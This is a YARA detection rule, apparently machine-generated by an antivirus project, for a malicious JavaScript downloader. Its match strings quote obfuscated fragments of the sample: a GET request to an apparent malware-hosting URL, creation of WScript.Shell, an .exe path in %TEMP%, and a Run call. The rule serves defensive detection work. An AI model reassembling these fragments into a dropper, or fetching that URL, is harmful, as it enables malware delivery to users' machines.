rule sig_20160401_64b1d63acab1c0b7096cffa369cd32cc {
  meta:
    description = "datamaliciousorder - file 20160401_64b1d63acab1c0b7096cffa369cd32cc.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8706c5a6b226023e4836a4f7a6a458b31498381f4c48a3ff77b8d0c64f8b0b2c"

  strings:
    $s1  = "IvgMs[DznTt](\"G\" + \"ET\", \"http://geetanjalifincorp.com/pqw9aso\", false);" fullword ascii
    $s2  = "function QwCx(EsKr, ZqyEd){UiqYyi = UiqYyi * 1; return EsKr - ZqyEd;};" fullword ascii
    $s3  = "var WjoRwk = function VfEzt() {return WScript[AuwUa](\"WScript\"+\".Shell\");}(), SbKhv = 11;" fullword ascii
    $s4  = "if (IvgMs[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function HbvTu() {return WjoRwk[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"J3cSqDUgEdpx.ex\" + \"e\";};" fullword ascii
    $s6  = "function YcwYgc(){return FnzMw + \"\";};" fullword ascii
    $s7  = "function RdyPbe() {return ((PkkTp == true) && (PkkTp == AarPi)) ? 1 : UiqYyi;};" fullword ascii
    $s8  = "var AarPi = false;" fullword ascii
    $s9  = "var PkkTp = false;" fullword ascii
    $s10 = "function LxyUg()" fullword ascii
    $s11 = "function BrlHnk(){return 23;};" fullword ascii
    $s12 = "function DzpRd(BdePyd){WjoRwk[\"R\"+\"un\"](BdePyd, UiqYyi, UiqYyi);};" fullword ascii
    $s13 = "function VejEv(){return AuwUa;};" fullword ascii
    $s14 = "return QwCx(LbHug, LfTar);" fullword ascii
    $s15 = "PkkTp = true; " fullword ascii
    $s16 = "}while (JmXaa);" fullword ascii
    $s17 = "function BzsLxp(YheQre) {var EpXrf = (1, 2, 3, 4, 5, YheQre); return EpXrf;};" fullword ascii
    $s18 = "var DfEj = new this[\"Date\"]();" fullword ascii
    $s19 = "var HvGnl = false;" fullword ascii
    $s20 = "AarPi = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}